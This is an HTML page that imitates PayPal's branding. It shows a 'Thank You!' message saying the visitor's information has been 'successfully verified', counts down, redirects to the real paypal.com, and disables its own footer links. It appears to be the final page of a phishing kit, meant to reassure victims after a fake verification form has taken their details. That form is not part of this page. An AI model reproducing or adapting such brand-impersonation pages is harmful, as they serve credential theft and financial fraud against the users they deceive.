<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting - PayPal</title>
    <link rel="stylesheet" href="assets/css/styles.css">
    <link rel="icon" type="image/png" href="assets/images/favicon.png">
    <style>
        .exit-container {
            text-align: center;
            padding: 40px 20px;
        }

        .checkmark-circle {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            background: #28a745;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: scaleIn 0.5s ease-out;
        }

        .checkmark {
            width: 40px;
            height: 40px;
            stroke: white;
            stroke-width: 3;
            stroke-linecap: round;
            stroke-linejoin: round;
            fill: none;
            animation: drawCheck 0.5s ease-out 0.3s forwards;
            stroke-dasharray: 60;
            stroke-dashoffset: 60;
        }

        @keyframes scaleIn {
            0% {
                transform: scale(0);
            }
            100% {
                transform: scale(1);
            }
        }

        @keyframes drawCheck {
            100% {
                stroke-dashoffset: 0;
            }
        }

        .exit-title {
            font-size: 24px;
            font-weight: 600;
            color: #2c2e2f;
            margin-bottom: 15px;
        }

        .exit-message {
            font-size: 16px;
            color: #6c7378;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .countdown {
            font-size: 48px;
            font-weight: 700;
            color: #0070ba;
            margin: 30px 0;
            animation: pulse 1s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
        }

        .redirect-info {
            font-size: 14px;
            color: #9da3a8;
            margin-top: 20px;
        }

        .manual-link {
            display: inline-block;
            margin-top: 20px;
            color: #0070ba;
            text-decoration: none;
            font-size: 14px;
            padding: 10px 20px;
            border: 1px solid #0070ba;
            border-radius: 20px;
            transition: all 0.3s ease;
        }

        .manual-link:hover {
            background: #0070ba;
            color: white;
        }
    </style>

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <main class="container">
        <div class="login-card">
            <div class="logo">
                <svg width="101" height="32" viewBox="0 0 101 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clip-path="url(#clip0)">

                        <path d="M95.088 3.226l-3.435 21.836a.62.62 0 00.612.727h3.878c.501 0 .934-.368 1.018-.863l3.391-21.073a.62.62 0 00-.612-.727h-4.24a.616.616 0 00-.61.515z" fill="#009CDE"/>
                    </g>
                </svg>
            </div>

            <div class="exit-container">
                <div class="checkmark-circle">
                    <svg class="checkmark" viewBox="0 0 52 52">
                        <path d="M14 27l8 8 16-16"/>
                    </svg>
                </div>

                <h1 class="exit-title">Thank You!</h1>
                <p class="exit-message">
                    Your information has been successfully verified.<br>
                    You will be redirected to PayPal shortly.
                </p>

                <div class="countdown" id="countdown">5</div>

                <p class="redirect-info">
                    Redirecting automatically in <span id="countdown-text">5</span> seconds...
                </p>

                <a href="https://www.paypal.com" class="manual-link" id="manualLink">
                    Click here if not redirected
                </a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <a href="#" class="footer-link">Contact Us</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Legal</a>
        <a href="#" class="footer-link">Policy Updates</a>
        <a href="#" class="footer-link">Worldwide</a>
    </footer>

    <script>
        let timeLeft = 5;
        const countdownElement = document.getElementById('countdown');
        const countdownTextElement = document.getElementById('countdown-text');

        const countdown = setInterval(() => {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            countdownTextElement.textContent = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                window.location.href = 'https://www.paypal.com';
            }
        }, 1000);

        // Prevent footer links from working
        document.querySelectorAll('.footer-link').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
            });
        });
    </script>
</body>
</html>
